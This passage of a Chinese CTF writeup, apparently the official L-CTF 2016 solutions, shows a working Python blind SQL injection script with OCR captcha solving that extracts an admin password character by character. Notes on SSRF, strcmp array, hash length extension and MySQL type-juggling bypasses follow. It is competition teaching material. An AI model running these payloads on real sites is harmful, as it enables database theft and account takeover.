alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">txt</code><code class="python keyword">=</code><code class="python plain">r.text</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;txt</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;r.headers['Content-Length']</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python string">'2000'</code>&nbsp;<code class="python keyword">in</code>&nbsp;<code class="python plain">txt:</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python string">"register&nbsp;OK!!"</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">flag&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">login(name)</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">flag</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">pass</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;"not&nbsp;register"</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python color1">False</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code>&nbsp;<code class="python plain">Exception,&nbsp;e:</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">pass</code></div><div class="line number32 index31 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">login(name):</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">url1</code><code class="python keyword">=</code><code class="python plain">url</code><code class="python keyword">+</code><code class="python string">"check.php"</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">range</code><code class="python plain">(</code><code class="python value">20</code><code class="python plain">):</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">veri&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">verify()</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;veri</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload</code><code class="python keyword">=</code><code class="python plain">{</code><code class="python string">'user'</code><code class="python plain">:name,</code><code class="python string">'pass'</code><code class="python plain">:</code><code class="python string">'111'</code><code class="python plain">,</code><code class="python string">'verify'</code><code class="python plain">:veri,</code><code class="python string">'typer'</code><code class="python plain">:</code><code class="python string">'0'</code><code class="python plain">,</code><code class="python string">'login'</code><code class="python plain">:</code><code class="python string">'%E7%99%BB%E9%99%86'</code><code class="python plain">}</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r</code><code class="python keyword">=</code><code class="python plain">requests.post(url1,data</code><code class="python keyword">=</code><code class="python plain">payload)</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">txt</code><code class="python keyword">=</code><code class="python plain">r.text</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;txt</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python string">'2000'</code>&nbsp;<code class="python keyword">in</code>&nbsp;<code class="python plain">txt:</code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">"login&nbsp;OK!!"</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;r.headers</code></div><div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">headers[</code><code class="python string">'Cookie'</code><code class="python plain">]&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">r.headers[</code><code class="python string">'Set-Cookie'</code><code class="python plain">]</code></div><div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">v&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">setpic(headers)</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">v:</code></div><div class="line number48 index47 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python color1">True</code></div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#sys.exit()</code></div><div class="line number50 index49 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number51 index50 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number52 index51 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">pass</code></div><div class="line number53 index52 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;"not&nbsp;login"</code></div><div class="line number54 index53 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python color1">False</code></div><div class="line number55 index54 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code>&nbsp;<code class="python plain">Exception,&nbsp;e:</code></div><div class="line number56 index55 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">raise</code>&nbsp;<code class="python plain">e</code></div><div class="line number57 index56 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">verify():</code></div><div class="line number58 index57 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">url&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">"http://xxxxxx/verify.php"</code></div><div class="line number59 index58 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number60 index59 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r</code><code class="python keyword">=</code><code class="python plain">requests.get(url,headers</code><code class="python keyword">=</code><code class="python plain">headers)</code></div><div class="line number61 index60 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">i</code><code class="python keyword">=</code><code class="python plain">Image.</code><code class="python functions">open</code><code class="python plain">(BytesIO(r.content))</code></div><div class="line number62 index61 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">im&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">i.convert(</code><code class="python string">'L'</code><code class="python plain">)</code></div><div class="line number63 index62 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">threshold&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">140</code></div><div class="line number64 index63 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">table&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">[]</code></div><div class="line number65 index64 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">range</code><code class="python plain">(</code><code class="python value">256</code><code class="python plain">):</code></div><div class="line number66 index65 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">i&nbsp;&lt;&nbsp;threshold:</code></div><div class="line number67 index66 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">table.append(</code><code class="python value">0</code><code class="python plain">)</code></div><div class="line number68 index67 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number69 index68 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">table.append(</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number70 index69 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">out&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">im.point(table,&nbsp;</code><code class="python string">'1'</code><code class="python plain">)&nbsp;</code></div><div class="line number71 index70 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">pytesseract.image_to_string(out)</code></div><div class="line number72 index71 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code>&nbsp;<code class="python plain">Exception,&nbsp;e:</code></div><div class="line number73 index72 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">raise</code>&nbsp;<code class="python plain">e</code></div><div class="line number74 index73 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">setpic(headers):</code></div><div class="line number75 index74 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">url1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">"http://xxxxxx/ucenter.php"</code></div><div class="line number76 index75 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number77 index76 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r</code><code class="python keyword">=</code><code class="python plain">requests.post(url1,headers</code><code class="python keyword">=</code><code class="python plain">headers)</code></div><div class="line number78 index77 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">txt</code><code class="python keyword">=</code><code class="python plain">r.text</code></div><div class="line number79 index78 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;txt</code></div><div class="line number80 index79 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python string">"math1as.com/pic"</code>&nbsp;<code class="python keyword">in</code>&nbsp;<code class="python plain">txt:</code></div><div class="line number81 index80 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python color1">True</code></div><div class="line number82 index81 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number83 index82 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python color1">False</code></div><div class="line number84 index83 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code>&nbsp;<code class="python plain">Exception,&nbsp;e:</code></div><div class="line number85 index84 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">raise</code>&nbsp;<code class="python plain">e</code></div><div class="line number86 index85 alt1"><code class="python plain">headers</code><code class="python keyword">=</code><code class="python plain">{</code></div><div class="line number87 index86 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">"User-Agent"</code><code class="python plain">:</code><code class="python string">"Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;10.0;&nbsp;WOW64;&nbsp;rv:48.0)&nbsp;Gecko/20100101&nbsp;Firefox/48.0"</code><code class="python plain">,</code></div><div class="line number88 index87 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">"Accept-Language"</code><code class="python plain">:</code><code class="python string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</code><code class="python plain">,</code></div><div class="line number89 index88 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">"Accept"</code><code class="python plain">:</code><code class="python string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</code><code class="python plain">,</code></div><div class="line number90 index89 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">"Accept-Encoding"</code><code class="python plain">:</code><code class="python string">"gzip,&nbsp;deflate"</code><code class="python plain">,</code></div><div class="line number91 index90 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">"Cookie"</code><code class="python plain">:</code><code class="python string">"3vitee1ku455s2etkefct41j10"</code></div><div class="line number92 index91 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number93 index92 alt2"><code class="python plain">url&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">"http://xxxxxx/"</code></div><div class="line number94 index93 alt1"><code class="python plain">payloads&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">[</code><code class="python string">'2'</code><code class="python plain">,&nbsp;</code><code class="python string">'6'</code><code class="python plain">,&nbsp;</code><code class="python string">'3'</code><code class="python plain">,&nbsp;</code><code class="python string">'4'</code><code class="python plain">,&nbsp;</code><code class="python string">'5'</code><code class="python plain">,&nbsp;</code><code class="python string">'1'</code><code class="python plain">,&nbsp;</code><code class="python string">'7'</code><code class="python plain">,&nbsp;</code><code class="python string">'8'</code><code class="python plain">,&nbsp;</code><code class="python string">'9'</code><code class="python plain">,&nbsp;</code><code class="python string">'0'</code><code class="python plain">,</code><code class="python string">'f'</code><code class="python plain">,</code><code class="python string">'a'</code><code class="python plain">,</code><code class="python string">'b'</code><code class="python plain">,</code><code class="python string">'c'</code><code class="python plain">,</code><code class="python string">'d'</code><code class="python plain">,&nbsp;</code><code class="python string">'e'</code><code class="python plain">]</code></div><div class="line number95 index94 alt2"><code class="python comments">#payloads&nbsp;=['/','@','_','.',&nbsp;'-',&nbsp;'1',&nbsp;'2',&nbsp;'3',&nbsp;'4',&nbsp;'5',&nbsp;'6',&nbsp;'7',&nbsp;'8',&nbsp;'9',&nbsp;'0']</code></div><div class="line number96 index95 alt1"><code class="python comments">#payloads&nbsp;&nbsp;=list(string.ascii_lowercase)</code></div><div class="line number97 index96 alt2"><code class="python plain">ss&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">""</code></div><div class="line number98 index97 alt1"><code class="python comments">#name&nbsp;=&nbsp;'kkkkkkkk\'/**/or/**/exists(select/**/*/**/from/**/xdsec)/**/#'</code></div><div class="line number99 index98 alt2"><code class="python comments">#for&nbsp;i&nbsp;in&nbsp;payloads:</code></div><div class="line number100 index99 alt1"><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">range</code><code class="python plain">(</code><code class="python value">1</code><code class="python plain">,</code><code class="python value">33</code><code class="python plain">):</code></div><div class="line number101 index100 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">flag&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python color1">False</code></div><div class="line number102 index101 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">x&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">payloads:</code></div><div class="line number103 index102 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">name&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'kkkkkkkk\'/**/or/**/ord(substr((select/**/pass/**/from/**/flag_admin_233),'</code><code class="python keyword">+</code><code class="python functions">str</code><code class="python plain">(i)</code><code class="python keyword">+</code><code class="python string">',1))='</code><code class="python keyword">+</code><code class="python functions">str</code><code class="python plain">(</code><code class="python functions">ord</code><code class="python plain">(x))</code><code class="python keyword">+</code><code class="python string">'/**/#'</code></div><div class="line number104 index103 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#name&nbsp;=&nbsp;'kkkkkkkk\'/**/or/**/ord(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=0x666c61675f61646d696e5f323333/**/limit/**/2,1),4,1))=115/**/#'</code></div><div class="line number105 index104 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#name&nbsp;=&nbsp;'kkkkkkkk\'/**/or/**/length((select/**/admin/**/from/**/flag_admin_233))=5/**/#'</code></div><div class="line number106 index105 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#name&nbsp;=&nbsp;'kkkkkkkk\'/**/or/**/exists(select/**/id/**/from/**/flag_admin_233)/**/#'</code></div><div class="line number107 index106 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;name</code></div><div class="line number108 index107 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">flag&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">regist(name)</code></div><div class="line number109 index108 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">flag:</code></div><div class="line number110 index109 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">ss&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">x</code></div><div class="line number111 index110 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python plain">ss</code></div><div class="line number112 index111 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number113 index112 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#sys.exit()</code></div><div class="line number114 index113 alt1"><code class="python keyword">print</code>&nbsp;<code class="python string">"done"</code></div><div class="line number115 index114 alt2"><code class="python comments">#pass:6cb0598de4da617832e15f4c69570b7</code></div><div class="line number116 index115 alt1"><code class="python comments">#name&nbsp;=&nbsp;'kkkkkkkk\'/**/or/**/100&gt;50/**/#'</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">注入成功得到密码后还是无法直接登陆。然后在robots.txt处有一个base32加密的提示，所以去想办法访问scret_new_notice.php（这里需要以local访问,通过头像处的ssrf,通过@的基础认证方式绕过），得到的提示是admin用户改变了自己的用户名。在这种情况下，由于用来判断的函数是strcmp()，因此传入数组为User[]=xxxx使其返回值为0，成功得到flag。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Web300 【你一定不能来这】</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">感谢已毕业的phithon学长，部分思路来源于p总博客<a href="https://www.leavesongs.com/" _src="https://www.leavesongs.com/">https://www.leavesongs.com/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先在根目录下的crossdomain.xml发现隐藏的域名：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t019302f0b28c5dde9d.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t019302f0b28c5dde9d.png" title="t016115579c68b05814.png" alt="http://p3.qhimg.com/t016115579c68b05814.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">访问该域名后可下载一份download.php源码：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01308c69557b62c5ae.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01308c69557b62c5ae.png" title="t013022993a36c08410.png" alt="http://p1.qhimg.com/t013022993a36c08410.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">并发现可以利用hash长度扩展攻击下载得到www.rar。由于不知道secret长度，需要爆破。Secret长度为18，下载`www.rar`发现压缩包加密了，二进制观察压缩包发现文件尾有一串jjencode，拖入浏览器中可得一段培根密码，解密得到压缩包密码：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t012a42c36d957fee0b.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t012a42c36d957fee0b.png" title="t019a0c767190e7935c.png" alt="http://p1.qhimg.com/t019a0c767190e7935c.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解压后进行代码审计，可以得到管理员邮箱。又发现要得到flag要重置id=0的用户的密码。而在php中id=0是会被判断为空的，而由于mysql的特性，会将0aa这样的字符串转成0.所以id=0aa即可进入第一个if。</span></p><p style="text-indent: 2em; text-align: left;"><span 